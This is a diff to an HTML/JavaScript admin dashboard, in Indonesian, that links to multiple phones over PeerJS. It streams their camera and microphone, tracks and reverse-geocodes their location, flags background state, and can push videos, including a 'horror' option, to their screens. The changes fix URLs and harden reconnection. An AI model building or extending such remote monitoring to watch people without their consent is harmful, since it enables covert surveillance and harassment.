@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Admin Multi-HP - Live Kamera, Suara, Lokasi & Push Layar</title>
-  <script src="[https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js](https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js)"></script>
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
     body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }
@@ -139,7 +139,7 @@
       <div id="modalVideoFields" class="hidden">
         <div style="margin-bottom:10px;">
           <label class="modal-label" for="vidUrlInput">URL Video (MP4 / WebM)</label>
-          <input id="vidUrlInput" class="modal-input" type="text" value="[https://b.top4top.io/m_3975xed1e1.mp4](https://b.top4top.io/m_3975xed1e1.mp4)" placeholder="https://.../video.mp4" />
+          <input id="vidUrlInput" class="modal-input" type="text" value="https://b.top4top.io/m_3975xed1e1.mp4" placeholder="https://.../video.mp4" />
         </div>
         <label class="modal-row" style="margin-bottom:8px;">
           <input type="checkbox" id="vidHorrorBgCheck" checked />
@@ -197,6 +197,10 @@
     const BACKGROUND_GRACE_MS = 120000;
 
     const PEER_CONFIG = {
+      host: "0.peerjs.com",
+      port: 443,
+      path: "/",
+      secure: true,
       debug: 0,
       config: {
         iceServers: [
@@ -279,7 +283,7 @@
         entry.conn.send(payload);
         return true;
       }
-      if (peer && !peer.destroyed) {
+      if (peer && !peer.destroyed && peer.open) {
         const tempConn = peer.connect(id, { reliable: true });
         entry.conn = tempConn;
         tempConn.on("open", () => {
@@ -398,7 +402,7 @@
       areaPending.add(key);
 
       try {
-        const url = `[https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=$](https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=$){encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=14&addressdetails=1`;
+        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=14&addressdetails=1`;
         const res = await fetch(url, {
           headers: { "Accept": "application/json" }
         });
@@ -440,74 +444,82 @@
       });
     }
 
+    function bindMemberDataChannel(conn) {
+      const id = conn.peer;
+      const entry = ensureDeviceEntry(id);
+      entry.conn = conn;
+
+      const triggerRequest = () => {
+        entry.closedExplicitly = false;
+        entry.connected = true;
+        entry.updatedAt = Date.now();
+        if (conn.open) {
+          conn.send({ type: "REQUEST_STREAM", enableMic: true });
+          conn.send({ type: "PING" });
+        }
+        syncDeviceCard(id);
+      };
+
+      if (conn.open) triggerRequest();
+      conn.on("open", triggerRequest);
+
+      conn.on("data", (msg) => {
+        if (!msg) return;
+        if (msg.type === "HP_CLOSING") {
+          entry.closedExplicitly = true;
+          entry.connected = false;
+          entry.stream = null;
+          attachStreamToCard(id, null);
+          syncDeviceCard(id);
+          return;
+        }
+
+        if (msg.type === "HP_PRESENCE") {
+          entry.closedExplicitly = false;
+          entry.hpBrand = msg.hpBrand || entry.hpBrand || id.split("-")[0] || "";
+          entry.hpName = msg.hpName || entry.hpName || "";
+          entry.inBackground = Boolean(msg.inBackground);
+          entry.facing = msg.facing || entry.facing || "Depan";
+          entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
+          entry.micOn = Boolean(msg.micOn);
+          if (msg.location && typeof msg.location.lat === "number" && typeof msg.location.lng === "number") {
+            entry.location = msg.location;
+            resolveAreaName(id, msg.location.lat, msg.location.lng);
+          }
+          entry.device = msg.device || entry.device;
+          entry.connected = true;
+          entry.updatedAt = Date.now();
+
+          if ((!entry.stream || !entry.stream.active) && conn.open) {
+            conn.send({ type: "REQUEST_STREAM", enableMic: true });
+          }
+          syncDeviceCard(id);
+        }
+      });
+
+      conn.on("close", () => {
+        if (devices[id] && devices[id].conn === conn) {
+          devices[id].conn = null;
+          devices[id].connected = false;
+          syncDeviceCard(id);
+        }
+      });
+
+      conn.on("error", () => {});
+    }
+
     function initAdminPeer() {
       if (!isUnlocked() || peer) return;
       document.getElementById("lobbyStatus").textContent = "Menghubungkan ke Lobby Admin...";
       peer = new Peer(ADMIN_LOBBY_ID, PEER_CONFIG);
 
-      peer.on("open", () => {
-        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${ADMIN_LOBBY_ID}) • Menunggu HP terhubung`;
+      peer.on("open", (id) => {
+        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${id}) • Siap menerima koneksi HP`;
+        connectAllDevices();
       });
 
       peer.on("connection", (conn) => {
-        const id = conn.peer;
-        const entry = ensureDeviceEntry(id);
-        entry.conn = conn;
-        entry.closedExplicitly = false;
-        entry.connected = true;
-        entry.updatedAt = Date.now();
-        syncDeviceCard(id);
-
-        const triggerRequest = () => {
-          if (conn.open) {
-            conn.send({ type: "REQUEST_STREAM", enableMic: true });
-          }
-        };
-
-        if (conn.open) triggerRequest();
-        conn.on("open", triggerRequest);
-
-        conn.on("data", (msg) => {
-          if (!msg) return;
-          if (msg.type === "HP_CLOSING") {
-            entry.closedExplicitly = true;
-            entry.connected = false;
-            entry.stream = null;
-            attachStreamToCard(id, null);
-            syncDeviceCard(id);
-            return;
-          }
-
-          if (msg.type === "HP_PRESENCE") {
-            entry.closedExplicitly = false;
-            entry.hpBrand = msg.hpBrand || entry.hpBrand || id.split("-")[0] || "";
-            entry.hpName = msg.hpName || entry.hpName || "";
-            entry.inBackground = Boolean(msg.inBackground);
-            entry.facing = msg.facing || entry.facing || "Depan";
-            entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
-            entry.micOn = Boolean(msg.micOn);
-            if (msg.location && typeof msg.location.lat === "number" && typeof msg.location.lng === "number") {
-              entry.location = msg.location;
-              resolveAreaName(id, msg.location.lat, msg.location.lng);
-            }
-            entry.device = msg.device || entry.device;
-            entry.connected = true;
-            entry.updatedAt = Date.now();
-
-            if ((!entry.stream || !entry.stream.active) && conn.open) {
-              conn.send({ type: "REQUEST_STREAM", enableMic: true });
-            }
-            syncDeviceCard(id);
-          }
-        });
-
-        conn.on("close", () => {
-          if (devices[id]) {
-            devices[id].conn = null;
-            devices[id].connected = false;
-            syncDeviceCard(id);
-          }
-        });
+        bindMemberDataChannel(conn);
       });
 
       peer.on("call", (call) => {
@@ -533,7 +545,18 @@
       });
 
       peer.on("disconnected", () => {
-        if (peer && !peer.destroyed) peer.reconnect();
+        document.getElementById("lobbyStatus").textContent = "Koneksi server signaling terputus, menyambung ulang...";
+        if (peer && !peer.destroyed) {
+          setTimeout(() => {
+            if (peer && !peer.destroyed && peer.disconnected) {
+              try { peer.reconnect(); } catch (_) {}
+            }
+          }, 1000);
+        }
+      });
+
+      peer.on("error", (err) => {
+        document.getElementById("lobbyStatus").textContent = `Info signaling: ${err && err.type ? err.type : "mencoba ulang"}`;
       });
     }
 
@@ -566,9 +589,12 @@
 
     function requestStreamFromDevice(id, enableMic = true) {
       const entry = devices[id];
-      if (!entry || !peer || peer.destroyed) return;
+      if (!entry || !peer || peer.destroyed || !peer.open) return;
       if (entry.conn && entry.conn.open) {
         entry.conn.send({ type: "REQUEST_STREAM", enableMic });
+      } else {
+        const newConn = peer.connect(id, { reliable: true });
+        bindMemberDataChannel(newConn);
       }
       if (entry.stream) {
         attachStreamToCard(id, entry.stream);
@@ -624,6 +650,9 @@
     }
 
     function connectAllDevices() {
+      if (peer && !peer.destroyed && peer.disconnected) {
+        try { peer.reconnect(); } catch (_) {}
+      }
       for (const id of Object.keys(devices)) {
         requestStreamFromDevice(id, true);
       }
@@ -645,9 +674,15 @@
     }
 
     function pingAllDevices() {
-      for (const entry of Object.values(devices)) {
+      if (peer && !peer.destroyed && peer.disconnected) {
+        try { peer.reconnect(); } catch (_) {}
+      }
+      for (const [id, entry] of Object.entries(devices)) {
         if (entry.conn && entry.conn.open) {
           entry.conn.send({ type: "PING" });
+        } else if (peer && !peer.destroyed && peer.open && !entry.closedExplicitly) {
+          const reConn = peer.connect(id, { reliable: true });
+          bindMemberDataChannel(reConn);
         }
       }
       syncAllCards();
@@ -822,7 +857,7 @@
       if (actEl) {
         let mapLink = actEl.querySelector(".map-link");
         if (hasCoords) {
-          const mapUrl = `[https://www.google.com/maps?q=$](https://www.google.com/maps?q=$){loc.lat},${loc.lng}`;
+          const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
           if (!mapLink) {
             mapLink = document.createElement("a");
             mapLink.className = "map-link";
